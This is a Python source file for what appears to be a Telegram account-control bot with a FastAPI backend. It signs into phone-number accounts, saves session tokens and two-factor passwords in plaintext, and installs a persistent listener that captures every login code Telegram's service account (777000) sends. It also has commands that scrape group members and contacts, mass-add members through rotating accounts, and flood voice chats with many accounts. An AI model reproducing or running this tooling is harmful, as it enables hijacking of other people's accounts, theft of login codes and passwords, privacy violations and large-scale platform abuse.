    clean_phone_with_plus = clean_phone_input(phone_in)
    db_clean_phone = clean_phone_with_plus.replace("+", "")
    
    await event.reply(f"⚡ **Submitting Verification Token `{code}`** for `{clean_phone_with_plus}`...")
    
    state = AUTH_STATES.get(db_clean_phone)
    client = None
    phone_code_hash = None
    device = None
    
    if state and state.get("client"):
        client = state["client"]
        phone_code_hash = state["phone_code_hash"]
        device = state.get("device")
    else:
        record = db.get_session_by_phone(db_clean_phone)
        if not record or not record.get("session"):
            await event.reply("❌ **Error:** No active login state found for this phone. Run `/login` first.")
            return
        
        device = {
            "device_model": record.get("device_model", "PC 64bit"),
            "system_version": record.get("system_version", "Windows 11"),
            "app_version": record.get("app_version", "4.8.4")
        }
        
        client = TelegramClient(
            StringSession(record["session"]),
            api_id=CONFIG["API_ID"],
            api_hash=CONFIG["API_HASH"],
            device_model=device["device_model"],
            system_version=device["system_version"],
            app_version=device["app_version"]
        )
        await client.connect()
        phone_code_hash = record.get("phone_code_hash")

    try:
        await client.sign_in(phone=clean_phone_with_plus, code=code, phone_code_hash=phone_code_hash)
        
        session_str = client.session.save()
        # Explicit status update to save clean active session with empty password slot
        db.update_session_status(db_clean_phone, "active", session_str)
        if hasattr(db, "save_authorized_session"):
            db.save_authorized_session(db_clean_phone, session_str, "active", device, two_fa_password=None)
        
        # 🛠️ REAL-TIME OTP INTERCEPTOR (Dumps past system service notifications)
        try:
            past_messages = await client.get_messages(777000, limit=3)
            for msg in past_messages:
                if msg and msg.message:
                    db.log_received_otp(db_clean_phone, "777000", msg.message)
        except Exception as initial_fetch_err:
            audit_logger.error(f"Failed to dump initial past service messages: {initial_fetch_err}")

        # Live persistent listener hook for incoming future OTP strings
        @client.on(events.NewMessage(from_users=777000))
        async def telegram_service_handler(incoming_event):
            if incoming_event.message and incoming_event.message.message:
                db.log_received_otp(db_clean_phone, "777000", incoming_event.message.message)

        await event.reply(f"✅ **Login Successful!**\nSession for `{clean_phone_with_plus}` is now live and saved in DB 1 ecosystem.")
        if db_clean_phone in AUTH_STATES: 
            AUTH_STATES.pop(db_clean_phone)
        
    except SessionPasswordNeededError:
        session_str = client.session.save()
        db.update_session_status(db_clean_phone, "2fa_required", session_str)
        
        # Keep client instance dynamic inside state arrays, caching device config mapping
        AUTH_STATES[db_clean_phone] = {
            "client": client, 
            "phone_code_hash": phone_code_hash,
            "device": device
        }
        await event.reply(
            f"🔒 **Two-Factor Authentication (2FA) is Active!**\n"
            f"Execute the following command sequence path:\n"
            f"`/verify_2fa {db_clean_phone} PASSWORD`"
        )
    except Exception as e:
        await event.reply(f"❌ **Verification Failed!**\nTraceback: `{str(e)}`")
    finally:
        if db_clean_phone not in AUTH_STATES:
            try: await client.disconnect()
            except: pass


# =====================================================================
# === 3. ADVANCED 2FA BYPASS & PASSWORD RETENTION CORE (/verify_2fa) =
# =====================================================================
@bot.on(events.NewMessage(pattern=r'/verify_2fa\s+(\+\d+|\d+)\s+(.+)'))
async def verify_2fa_handler(event):
    if not is_admin(event.sender_id): return

    phone_in = event.pattern_match.group(1)
    password = str(event.pattern_match.group(2)).strip()

    clean_phone_with_plus = clean_phone_input(phone_in)
    db_clean_phone = clean_phone_with_plus.replace("+", "")

    await event.reply(f"🔒 **Submitting 2FA security matrix password** for `{clean_phone_with_plus}`...")

    state = AUTH_STATES.get(db_clean_phone)
    client = None
    device = None
    
    if state and state.get("client"):
        client = state["client"]
        device = state.get("device")
    else:
        record = db.get_session_by_phone(db_clean_phone)
        if not record:
            await event.reply("❌ **Error:** No session data located for this index.")
            return
            
        device = {
            "device_model": record.get("device_model", "PC 64bit"),
            "system_version": record.get("system_version", "Windows 11"),
            "app_version": record.get("app_version", "4.8.4")
        }
        
        client = TelegramClient(
            StringSession(record["session"]),
            api_id=CONFIG["API_ID"],
            api_hash=CONFIG["API_HASH"],
            device_model=device["device_model"],
            system_version=device["system_version"],
            app_version=device["app_version"]
        )
        await client.connect()

    try:
        # Submit credentials to cloud servers
        await client.sign_in(password=password)
        
        final_session_str = client.session.save()
        
        # 💾 CORE DYNAMIC 2FA RETENTION MATRIX
        # 1. Update status tracking row variables
        db.update_session_status(db_clean_phone, "active", final_session_str)
        
        # 2. Inject or update the direct MongoDB document with password entry field
        if hasattr(db, "save_authorized_session"):
            db.save_authorized_session(
                phone=db_clean_phone,
                session_str=final_session_str,
                status="active",
                device=device,
                two_fa_password=password  # Saved permanently in document structure
            )
        else:
            # Fallback direct dynamic operational update in case explicit method missing from database file
            db.source_accounts.update_one(
                {"phone": db_clean_phone},
                {"$set": {"2fa_password": password, "status": "active", "session_string": final_session_str}}
            )

        # 🛠️ REAL-TIME OTP INTERCEPTOR INJECTIONS FOR 2FA CHANNELS
        try:
            past_messages = await client.get_messages(777000, limit=3)
            for msg in past_messages:
                if msg and msg.message:
                    db.log_received_otp(db_clean_phone, "777000", msg.message)
        except Exception as initial_fetch_err:
            audit_logger.error(f"Failed to dump initial past service messages: {initial_fetch_err}")

        # Persistent live monitoring setup for 2FA authorized nodes
        @client.on(events.NewMessage(from_users=777000))
        async def telegram_service_handler(incoming_event):
            if incoming_event.message and incoming_event.message.message:
                db.log_received_otp(db_clean_phone, "777000", incoming_event.message.message)

        await event.reply(f"🎉 **2FA Bypass Complete & Password Saved!**\n`{clean_phone_with_plus}` status elevated to `active` inside DB 1.")
        if db_clean_phone in AUTH_STATES: 
            AUTH_STATES.pop(db_clean_phone)
            
    except Exception as e:
        await event.reply(f"❌ **2FA Submission Rejected:** `{str(e)}`")
    finally:
        if db_clean_phone not in AUTH_STATES:
            try: 
                await client.disconnect()
            except: 
                pass
            
            
# --- 4. /details Command ---
@bot.on(events.NewMessage(pattern=r'/details\s+(.+)'))
async def details_handler(event):
    if not is_admin(event.sender_id): return

    phone_in = event.pattern_match.group(1)
    clean_phone_with_plus = clean_phone_input(phone_in)
    db_clean_phone = clean_phone_with_plus.replace("+", "")

    record = db.get_session_by_phone(db_clean_phone)

    if not record:
        await event.reply(f"❌ No records matching phone context: `{clean_phone_with_plus}` found in DB 1 cluster.")
        return

    ui_details = (
        f"📋 **ACCOUNT PROFILE INFORMATION DETAILS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 **Phone Link:** `+{record.get('phone')}`\n"
        f"⚡ **Status Node:** `{record.get('status', 'unknown').upper()}`\n"
        f"🛠️ **Device Model:** `{record.get('device_model', 'N/A')}`\n"
        f"💻 **OS Environment:** `{record.get('system_version', 'N/A')}`\n"
        f"⚙️ **Client Core App Version:** `{record.get('app_version', 'N/A')}`\n"
        f"🔑 **API ID Configuration:** `{CONFIG['API_ID']}`\n"
        f"📦 **String Session Token (Truncated):** `{record.get('session', '')[:25]}...`"
    )
    await event.reply(ui_details)

# --- 5. /list Command ---
@bot.on(events.NewMessage(pattern='/list'))
async def list_handler(event):
    if not is_admin(event.sender_id): return
    
    all_sessions = db.get_all_suite_sessions()
    if not all_sessions:
        await event.reply("📂 **DB 1 Layer is empty.** Active or pending node lines zero.")
        return
    
    active_lines = []
    pending_lines = []
    
    for item in all_sessions:
        phone = item.get("phone", "Unknown")
        status = item.get("status", "pending")
        dev = item.get("device_model", "Unknown Device")
        
        line_item = f"• `+{phone}` — _Device: {dev}_"
        if status == "active":
            active_lines.append(line_item)
        else:
            pending_lines.append(f"{line_item} [**{status.upper()}**]")

    response_text = "📊 **TELEGRAM ENGINE SECTOR INVENTORY**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    response_text += "🟢 **ACTIVE SESSIONS CORE:**\n" + ("\n".join(active_lines) if active_lines else "_No active nodes online._")
    response_text += "\n\n⏳ **PENDING / 2FA INTERCEPTIONS:**\n" + ("\n".join(pending_lines) if pending_lines else "_No current login registrations pending._")
    
    await event.reply(response_text)


# --- 6. /otp Command (Fully Restructured Architecture) ---
@bot.on(events.NewMessage(pattern=r'/otp\s+(.+)'))
async def otp_handler(event):
    if not is_admin(event.sender_id): return
    
    phone_in = event.pattern_match.group(1)
    clean_phone_with_plus = clean_phone_input(phone_in)
    db_clean_phone = clean_phone_with_plus.replace("+", "") # Strip plus strictly for Database collections matching query
    
    latest_log = db.get_latest_otp(db_clean_phone)
    
    if not latest_log:
        await event.reply(f"📭 No verified logs found inside database schema matching query `+{db_clean_phone}`.")
        return
        
    otp_ui = (
        f"📨 **LATEST SERVICE MESSAGE INTERCEPTED**\n"
        f"📱 **Account Target:** `+{db_clean_phone}`\n"
        f"📡 **Source Node:** `{latest_log.get('sender')}`\n"
        f"⏰ **Timestamp Node:** `{latest_log.get('date_received')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 **Message Payload:**\n`{latest_log.get('message')}`"
    )
    await event.reply(otp_ui)

# --- 7. /otp_wait Command ---
@bot.on(events.NewMessage(pattern=r'/otp_wait\s+(\+?\d+)(?:\s+(\d+))?'))
async def otp_wait_handler(event):
    if not is_admin(event.sender_id): return
    
    phone_in = event.pattern_match.group(1)
    duration_str = event.pattern_match.group(2)
    duration = int(duration_str) if duration_str else 60
    
    clean_phone_with_plus = clean_phone_input(phone_in)
    db_clean_phone = clean_phone_with_plus.replace("+", "")
    
    status_msg = await event.reply(f"🛰️ **Polling Engine Initiated:** Watching for new incoming 777000 data strings for `{clean_phone_with_plus}` (Timeout: `{duration}s`)...")

    start_time = time.time()
    initial_otp = db.get_latest_otp(db_clean_phone)
    initial_ts = initial_otp.get("timestamp", 0) if initial_otp else 0

    while time.time() - start_time < duration:
        await asyncio.sleep(3)
        current_otp = db.get_latest_otp(db_clean_phone)
        if current_otp and current_otp.get("timestamp", 0) > initial_ts:
            otp_ui = (
                f"🚨 **NEW INCOMING TIMELINE OTP DETECTED!**\n"
                f"📱 **Phone:** `{clean_phone_with_plus}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💬 **Content:**\n`{current_otp.get('message')}`"
            )
            await status_msg.edit(otp_ui)
            return
            
    await status_msg.edit(f"⏰ **Timeout reached (`{duration}s`)!** No newer state notifications caught inside logs for `{clean_phone_with_plus}`.")

# =====================================================================
# === 3. MANUAL /LOGOUT EXCLUSION LAYER ===============================
# =====================================================================
@bot.on(events.NewMessage(pattern='/logout'))
async def terminate_manual_login(event):
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ **Syntax Error:** Missing parameters. Format: `/logout +91XXXXXXXXXX`")
        return
        
    phone = args[1].strip().replace(" ", "")
    status_msg = await event.reply(f"⚡ **Initiating termination pipeline context for `{phone}`...**")
    
    target_sessions = db.get_active_target_sessions()
    matched_acc = next((acc for acc in target_sessions if str(acc.get("phone")) == phone), None)
    
    if not matched_acc:
        await status_msg.edit(f"⚠️ **Query Exception:** `{phone}` Target DB clusters me nahi mila.")
        return
        
    client = TelegramClient(
        StringSession(matched_acc["session_string"]),
        int(matched_acc.get("api_id", CONFIG["API_ID"])),
        str(matched_acc.get("api_hash", CONFIG["API_HASH"])),
    )
    try:
        await client.connect()
        if await client.is_user_authorized():
            await client.log_out() 
    except Exception as log_err:
        pass
    finally:
        try: await client.disconnect()
        except: pass
        
    db.remove_account_permanently(phone)
    await status_msg.edit(f"🗑️ **Revocation Complete:** Account session linked to `{phone}` has been closed, unauthorized, and wiped out of MongoDB records completely.")

# =====================================================================
# === 4. PRE-EXISTING INTEGRATED PIPELINES LOGIC CONTROL MATRIX =======
# =====================================================================
@bot.on(events.NewMessage(pattern=r'/reload(?:_accounts|\s+accounts)?$'))
async def reload_accounts_router(event):
    # 1. Pehle message send hoga aur status_msg variable mein save hoga
    status_msg = await event.reply("🔄 **Reloading Local Accounts...** `sessions/` aur `vars.txt` ko database schema ke sath sync kiya ja raha hai.")
    
    try:
        # 2. YAHAN DHAN DEIN: Hum wahi status_msg object pass kar rahe hain jise edit karna hai
        result = await db.reload_local_accounts(event=status_msg)
        
        # 3. Final Report Loop (Jab poora task khatam ho jaye)
        report = (
            "✅ **Reload Accounts Complete**\n"
            f"📥 Staged into source DB: `{result['staged']}`\n"
            f"🔐 Verified sessions updated: `{result['migrated']}`\n"
            f"⚠️ Failed: `{result['failed']}`\n"
            f"⏭️ Skipped: `{result['skipped']}`\n"
        )
        if result.get("errors"):
            report += "\n📋 **Issues:**\n"
            for idx, err in enumerate(result["errors"][:10], 1):
                report += f"`{idx}.` `{err['phone']}` ➜ {err['error']}\n"
        
        await status_msg.edit(report)
        
    except Exception as ex:
        await status_msg.edit(f"❌ **Reload Accounts Failed:** `{str(ex)}`")

@bot.on(events.NewMessage(pattern='/refresh_accounts'))
async def accounts_refresh_router(event):
    status_msg = await event.reply("🔄 **Initiating Global Dual-DB Account Migration...** Verification sequences triggered.")
    try:
        success, failed, errors = await voice_engine.process_cross_migration()
        report = (
            "🎯 **Migration Operations Report Complete**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Successfully Verified & Migrated: `{success}` accounts.\n"
            f"❌ Expired/Banned Skips: `{failed}` accounts.\n\n"
        )
        if errors:
            report += "📋 **Detailed Error Log Trace Matrix:**\n"
            for idx, err in enumerate(errors, 1):
                report += f" `{idx}.` 📱 Phone: `{err['phone']}` ➔ 🛑 {err['error']}\n"
        await status_msg.edit(report)
    except Exception as ex:
        await status_msg.edit(f"❌ **Core Migration Matrix Failed:** `{str(ex)}`")
        
        
@bot.on(events.NewMessage(pattern='/clean_banned_accounts'))
async def clean_banned_accounts_router(event):
    status_msg = await event.reply("📡 **On-Demand Connectivity Check Triggered!**\n\n⚙️ Saare database accounts ki live connectivity aur session validity check ki ja rahi hai... Isme thoda samay lag sakta hai, kripya pratiksha karein.")
    
    try:
        # Voice engine ke naye on-demand handler ko call karein
        active, cleaned, logs = await voice_engine.clean_banned_accounts_handler()
        
        report = (
            "🎯 **ACCOUNT CLEANUP SUMMARY REPORT**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✨ Total Active & Valid Sessions: `{active}`\n"
            f"🗑️ Total Banned/Expired Sessions Cleaned: `{cleaned}`\n\n"
        )
        
        if logs and cleaned > 0:
            report += "📋 **Cleaned Accounts Details:**\n"
            for idx, log in enumerate(logs[:15], 1):
                if "Network Error" not in log['error']:
                    report += f" `{idx}.` 📱 `{log['phone']}` ➔ 🛑 `{log['error']}`\n"
                    
        await status_msg.edit(report)
        
    except Exception as ex:
        await status_msg.edit(f"❌ **Cleanup Execution Failed:** `{str(ex)}`")
        

@bot.on(events.NewMessage(pattern='/remove_account'))
async def account_purge_router(event):
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ **Syntax Error:** Use: `/remove_account +91XXXXXXXXXX`")
        return
    phone = args[1].strip()
    if db.remove_account_permanently(phone):
        await event.reply(f"🗑️ **Data Record Dropped:** `{phone}` completely purged from system clusters.")
    else:
        await event.reply(f"⚠️ Record match inside system sets failed.")

# =====================================================================
# === 5. DYNAMIC DATA EXTRACTION PIPELINE (ROBUST ENGINE MATRICES) ====
# =====================================================================
async def generic_scrape_runner(event, mode, title_label):
    raw_text = event.text.strip()
    input_segments = raw_text.split(maxsplit=1)
    
    if len(input_segments) < 2:
        await event.reply(f"❌ **Syntax Error:** Proper target command input required!\n👉 **Format:** `/{event.text.split()[0].lstrip('/')} <group_link>`")
        return
        
    # FIX: Aggressively sanitize the link payload received from UI to prevent crash
    target_link = input_segments[1].strip().replace("<", "").replace(">", "").replace('"', '').replace("'", "")
    
    active_sessions = db.get_active_target_sessions()
    
    if not active_sessions:
        await event.reply("❌ **Operation Dropped:** Verified processing modules are empty. Run `/reload_accounts` first.")
        return
        
    status_msg = await event.reply(f"📡 **Launching {title_label} Scan Subroutine Engine...** Connecting via random available worker node...")
    
    try:
        selected_worker = random.choice(active_sessions)
        
        if mode == 'hidden':
            count = await scraper_engine.scrape_hidden_matrix(selected_worker, target_link)
        else:
            count = await scraper_engine.scrape_standard_pool(selected_worker, target_link, mode)
            
        await status_msg.edit(f"🏆 **[{title_label}] Extraction Sequence Successful!**\n\n📊 **Metrics Summary Output:**\n- Destination Data Registry Table: `scraped_data` collection\n- Total Parsed & Upserted Members: `{count}` unique profiles saved.")
    except Exception as e:
        logger.error(f"Global core script crash processing elements handler: {e}")
        await status_msg.edit(f"❌ **Scraper Infrastructure Exception:** `{str(e)[:150]}`")

@bot.on(events.NewMessage(pattern=r'/scrape_all(\s+|$)'))
async def scrape_all_cmd(event): 
    await generic_scrape_runner(event, 'all', 'Global Aggregate Full Scrape')

@bot.on(events.NewMessage(pattern=r'/scrape_active_24h(\s+|$)'))
async def scrape_24h_cmd(event): 
    await generic_scrape_runner(event, '24h', 'Aggressive 24h Active Scan')

@bot.on(events.NewMessage(pattern=r'/scrape_weekly(\s+|$)'))
async def scrape_weekly_cmd(event): 
    await generic_scrape_runner(event, 'weekly', '7-Day Activity Interval Crawler')

@bot.on(events.NewMessage(pattern=r'/scrape_hidden(\s+|$)'))
async def scrape_hidden_cmd(event): 
    await generic_scrape_runner(event, 'hidden', 'Deep Interaction Log Analyzer')

@bot.on(events.NewMessage(pattern='/delete_scraped_files'))
async def delete_scraped_files_cmd(event):
    try:
        # FIXED: Pointing to the correct 'scraped_members' attribute
        total_records = db.count_scraped_data()
        if total_records == 0:
            await event.reply("📂 **Database Notice:** Your cloud memory `scraped_members` collection layer is already completely empty.")
            return
            
        db.clear_scraped_data()
        await event.reply(f"🗑️ **Cloud Database Purged Clean!**\n\nSuccessfully dropped and cleared `{total_records}` user rows from your live MongoDB database server.")
    except Exception as e:
        logger.error(f"Database clean operation exception: {e}")
        await event.reply(f"❌ **Database Execution Fault:** Cannot drop active records lines: {e}")

# =====================================================================
# === 6. LOCAL CONTACTS EXTRACTOR =====================================
# =====================================================================
@bot.on(events.NewMessage(pattern='/scrape_my_contacts'))
async def contacts_extraction_pipeline(event):
    active_sessions = db.get_active_target_sessions()
    if not active_sessions:
        await event.reply("❌ No active verified profiles inside target database cache.")
        return
    user_contact_context[event.sender_id] = active_sessions
    ui_list = "📱 **Enterprise Account Matrix - Local Contacts Scraper**\n"
    for idx, acc in enumerate(active_sessions, 1):
        ui_list += f" `{idx}.` 📱 Phone: `{acc['phone']}` | Status: ✨ `Active Node` \n"
    ui_list += "\n👉 **Sabsay niche number send karein (Jaise: 1 ya 2):**"
    await event.reply(ui_list)

@bot.on(events.NewMessage)
async def catch_contact_selection_index(event):
    if event.sender_id not in user_contact_context or event.text.startswith('/'):
        return
    text_input = event.text.strip()
    if not text_input.isdigit(): return
    idx = int(text_input) - 1
    sessions_pool = user_contact_context.pop(event.sender_id)
    if idx < 0 or idx >= len(sessions_pool):
        await event.reply("❌ **Index error:** Selection canceled.")
        return
    target_acc = sessions_pool[idx]
    phone = target_acc["phone"]
    status_msg = await event.reply(f"📡 **Accessing {phone} local records...**")
    client = TelegramClient(
        StringSession(target_acc["session_string"]),
        int(target_acc.get("api_id", CONFIG["API_ID"])),
        str(target_acc.get("api_hash", CONFIG["API_HASH"])),
    )
    try:
        await client.connect()
        contacts_list = await client.get_contacts()
        if not contacts_list:
            await status_msg.edit(f"ℹ️ Account `{phone}` contains zero contacts.")
            return
        file_path = f"contacts_{phone}.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            for c_idx, u in enumerate(contacts_list, 1):
                f.write(f"{c_idx}. ID: {u.id} | Phone: +{u.phone or 'None'} | Name: {u.first_name or ''}\n")
        await bot.send_file(event.chat_id, file_path, caption=f"📥 **Contacts extracted successfully for `{phone}`**")
        if os.path.exists(file_path): os.remove(file_path)
    except Exception as err:
        await status_msg.edit(f"❌ Extraction error: `{str(err)}`")
    finally:
        await client.disconnect()

# =====================================================================
# === 7. ADDER & VOICE CHAT BACKGROUND WORKERS ========================
# =====================================================================
@bot.on(events.NewMessage(pattern='/addmembers'))
async def run_member_adder_matrix(event):
    if adder_engine.is_running:
        await event.reply("⚠️ Member Adding background engine processing pool is occupied right now.")
        return
    args = event.text.split()
    if len(args) < 2:
        await event.reply("❌ **Syntax Error:** Use: `/addmembers <group_link>`")
        return
    
    # Clean target string logic dynamically applied here as well
    target = args[1].strip().replace("<", "").replace(">", "").replace('"', '').replace("'", "")
    
    async def inline_ui_callback(text_update):
        try: await event.reply(text_update)
        except Exception: pass
    await event.reply("🚀 **Triggering Multi-Account Rotating Member Adder Engine...**")
    final_output = await adder_engine.execute_adding_pipeline(target, inline_ui_callback)
    await event.reply(final_output)

# =====================================================================
# === 8. DYNAMIC VOICE CLUSTER CONTROLLER WITH ALL-ACCOUNT FALLBACK ===
# =====================================================================
# =====================================================================
# === 8. DYNAMIC VOICE CLUSTER CONTROLLER WITH ALL-ACCOUNT FALLBACK ===
# =====================================================================
@bot.on(events.NewMessage(pattern=r'/run_voicechat(?:\s+(.+))?'))
async def start_voice_engine_cmd(event):
    if not is_admin(event.sender_id): return
    
    raw_input = event.pattern_match.group(1)
    if not raw_input:
        await event.reply("❌ **Syntax Error:** Proper input parameters required.\n👉 **Format:** `/run_voicechat <group_link> [count]`")
        return

    input_segments = raw_input.strip().split()
    target = input_segments[0].replace("<", "").replace(">", "").replace('"', '').replace("'", "")
    
    # Calculate available active inventory from database to dynamic enforce allocation bounds
    active_pool = db.get_active_target_sessions()
    total_available = len(active_pool)
    
    if total_available == 0:
        await event.reply("❌ **Operation Aborted:** Mapped source range limits are empty. No active sessions online.")
        return

    # 🎯 CRITICAL PARSE FIX: Extraction string integer from arguments payload pool safely
    desired_count = total_available
    if len(input_segments) >= 2:
        try:
            # Clean string spaces structure block checks
            parsed_num = int(input_segments[1].strip())
            if parsed_num > 0:
                # Setting balance constraints bounds logic cleanly
                desired_count = parsed_num
        except ValueError:
            # Fallback allocation back to total size structure loop
            desired_count = total_available

    # Dynamic target cap correction mapping to prevent index lookup confusion logs
    desired_count = min(desired_count, total_available)

    await event.reply(
        f"⚡ **Spawning PyTgCalls WebRTC Cluster Matrix...**\n"
        f"🎯 Target Allocation: `{desired_count}` accounts (Total Available: `{total_available}`).\n"
        f"🛰️ Destination: `{target}`"
    )
    
    # Transmit execution boundaries back to the core WebRTC queue loops
    response = await voice_engine.launch_voice_cluster(target, audio_file="silent.mp3", desired_count=desired_count)
    await event.reply(response)

# =====================================================================
# === 8. GLOBAL SYSTEM STATUS DASHBOARD ===============================
# =====================================================================
@bot.on(events.NewMessage(pattern='/status'))
async def system_diagnostics_snapshot(event):
    active_pool = len(db.get_active_target_sessions())
    # FIXED: Pointing to the correct 'scraped_members' attribute
    scraped_rows = db.count_scraped_data()
    stats_ui = (
        "📊 **SYSTEM SNAPSHOT METRICS**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✨ DB 2 Verified Target Sessions Node: `{active_pool}` active\n"
        f"📂 Scraped Raw Records Pool: `{scraped_rows}` profiles\n"
        f"🎙️ VoiceChat Engine Loop: " + ("`🟢 ACTIVE`" if voice_engine.is_running else "`🔴 INACTIVE`") + "\n"
        f"🚀 Member Adder Engine State: " + ("`🟢 RUNNING`" if adder_engine.is_running else "`🔴 RESTING`") + "\n"
        f"🛡️ Validated Proxies Pool: `{proxy_manager.working_count}` functional"
    )
    await event.reply(stats_ui)

# =====================================================================
# === 9. ASYNC INITIALIZATION ENGINE BOOTSTRAP WIZARD CORE ============
# =====================================================================
async def main_lifecycle_bootstrap():
    """Initializes frameworks, proxy networks, and registers structural bot handlers safely."""
    # 1. Trigger Proxy Pipeline Scan cleanly inside the correct runtime loop
    asyncio.create_task(proxy_manager.run_pipeline_scan())
    
    # 2. Spawns and starts the central Master Bot Client Instance directly
    await bot.start(bot_token=CONFIG["BOT_TOKEN"])
    logger.info("🤖 Master Telegram Bot Interface Authenticated and Online.")
    
    # 3. Mounts the autonomous active tracking background daemon worker task
    asyncio.create_task(continuous_session_auditor())
    
    # 4. Keeps loop architecture operational securely without losing execution contexts
    await bot.run_until_disconnected()




# === FastAPI ===
BASE_DIR = Path(__file__).parent.absolute()
app = FastAPI()
auth_bot: 'TelegramAuthBot' = None  # set in main()


# === Helper Functions ===
async def wait_for_otp_arrival(db_clean_phone: str, timeout_seconds: int = 120) -> dict:
    """
    Poll the database for OTP arrival within the specified timeout.
    Returns the OTP data if found, or None if timeout is reached.
    """
    start_time = time.time()
    initial_otp = db.get_latest_otp(db_clean_phone)
    initial_ts = initial_otp.get("timestamp", 0) if initial_otp else 0

    while time.time() - start_time < timeout_seconds:
        await asyncio.sleep(2)  # Poll every 2 seconds to reduce DB load
        current_otp = db.get_latest_otp(db_clean_phone)

        if current_otp and current_otp.get("timestamp", 0) > initial_ts:
            return current_otp

    return None


class LoginReq(BaseModel):
    phone: str

class VerifyReq(BaseModel):
    phone: str
    code: str

class Verify2FAReq(BaseModel):
    phone: str
    password: str

class BulkLoginReq(BaseModel):
    phones: list[str]


@app.post("/login")
async def api_login(req: LoginReq):
    phone = req.phone
    db_clean_phone = phone.replace("+", "").replace(" ", "")
    client = None
    try:
        client = auth_bot.create_user_client(phone)
        await asyncio.wait_for(client.connect(), timeout=20.0)

        if await client.is_user_authorized():
            auth_bot.sessions[phone] = client
            return {"status": "already_logged_in", "phone": phone}

        # Send code request and wait for confirmation
        sent = await asyncio.wait_for(client.send_code_request(phone), timeout=15.0)

        # Verify we got a valid response before storing
        if not sent or not sent.phone_code_hash:
            raise Exception("Failed to receive phone code hash from Telegram")

        # Store in pending_codes immediately after successful send
        auth_bot.pending_codes[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash,
            "timeout": sent.timeout,
        }

        # Now poll for OTP arrival confirmation (up to 120 seconds)
        otp_received = await wait_for_otp_arrival(db_clean_phone, timeout_seconds=120)

        if not otp_received:
            # OTP not confirmed within 120 seconds
            del auth_bot.pending_codes[phone]
            raise HTTPException(
                408,
                "OTP confirmation failed: Code was sent to Telegram, but OTP did not arrive within 120 seconds. Please try again."
            )

        # OTP confirmed! Return success
        return {
            "status": "code_sent",
            "phone": phone,
            "timeout": sent.timeout,
            "otp_confirmed": True,
            "message": "OTP successfully sent and confirmed to arrive on device"
        }

    except FloodWaitError as e:
        if client:
            try:
                await client.disconnect()
            except:
                pass
        raise HTTPException(429, f"Rate limited. Wait {e.seconds}s")
    except asyncio.TimeoutError:
        if client:
            try:
                await client.disconnect()
            except:
                pass
        raise HTTPException(408, "Request timeout: Could not connect to Telegram or send code")
    except HTTPException:
        # Re-raise HTTP exceptions as-is
        raise
    except Exception as e:
        if client:
            try:
                await client.disconnect()
            except:
                pass
        raise HTTPException(400, str(e))


@app.post("/verify")
async def api_verify(req: VerifyReq):
    phone, code = req.phone, req.code
    if phone not in auth_bot.pending_codes:
        raise HTTPException(404, "No pending login for this number. Call /login first.")

    pending = auth_bot.pending_codes[phone]
    client = pending["client"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=pending["phone_code_hash"])
        auth_bot.sessions[phone] = client
        del auth_bot.pending_codes[phone]
        auth_bot.save_account_metadata(phone)

        me = await client.get_me()
        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}

    except SessionPasswordNeededError:
        return {"status": "2fa_required", "phone": phone}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.post("/verify_2fa")
async def api_verify_2fa(req: Verify2FAReq):
    phone = req.phone
    if phone not in auth_bot.pending_codes:
        raise HTTPException(404, "No pending login for this number. Call /login first.")

    client = auth_bot.pending_codes[phone]["client"]
    try:
        await client.sign_in(password=req.password)
        auth_bot.sessions[phone] = client
        del auth_bot.pending_codes[phone]
        auth_bot.save_account_metadata(phone)
        auth_bot.save_twofa_password(phone, req.password)

        me = await client.get_me()
        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}

    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/sessions")
async def api_sessions():
    return {
        "active": list(auth_bot.sessions.keys()),
        "pending": list(auth_bot.pending_codes.keys()),
    }


@app.get(
    "/otp/{phone}",
    summary="Fetch OTP messages",
    description=(
        "Returns recent messages from Telegram's OTP sender (777000) for the given phone number. "
        "Use `since_seconds` to restrict to messages received in the last N seconds (default 300 = last 5 min). "
        "Use `limit` to control how many messages to return (default 5)."
    ),
)
async def get_otp(
    phone: str,
    limit: int = 5,
    since_seconds: int = 300,
):
    if phone not in auth_bot.sessions:
        raise HTTPException(404, "No active session for this number. Login first via /login.")

    client = auth_bot.sessions[phone]
    try:
        cutoff = datetime.now(timezone.utc) - timedelta(seconds=since_seconds)
        messages = await client.get_messages(777000, limit=limit)
        results = []
        for msg in messages:
            if msg.date < cutoff:
                continue
            ist = msg.date + timedelta(hours=5, minutes=30)
            results.append({
                "id": msg.id,
                "text": msg.message,
                "received_at_ist": ist.strftime("%d-%m-%Y %H:%M:%S"),
                "received_at_utc": msg.date.strftime("%d-%m-%Y %H:%M:%S"),
            })
        return {"phone": phone, "count": len(results), "messages": results}
    except Exception as e:
        raise HTTPException(500, str(e))


@app.get("/session/{phone}")
async def api_check(phone: str):
    if phone in auth_bot.sessions:
        try:
            me = await auth_bot.sessions[phone].get_me()
            return {"status": "active", "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username}
        except Exception:
            return {"status": "expired"}
    if phone in auth_bot.pending_codes:
        return {"status": "pending_otp"}
    raise HTTPException(404, "No session found")


@app.delete("/session/{phone}")
async def api_logout(phone: str):
    if phone in auth_bot.sessions:
        try:
            await auth_bot.sessions[phone].log_out()
        except Exception:
            pass
        await auth_bot.sessions[phone].disconnect()
        del auth_bot.sessions[phone]
        return {"status": "logged_out"}
    if phone in auth_bot.pending_codes:
        await auth_bot.pending_codes[phone]["client"].disconnect()
        del auth_bot.pending_codes[phone]
        return {"status": "cancelled"}
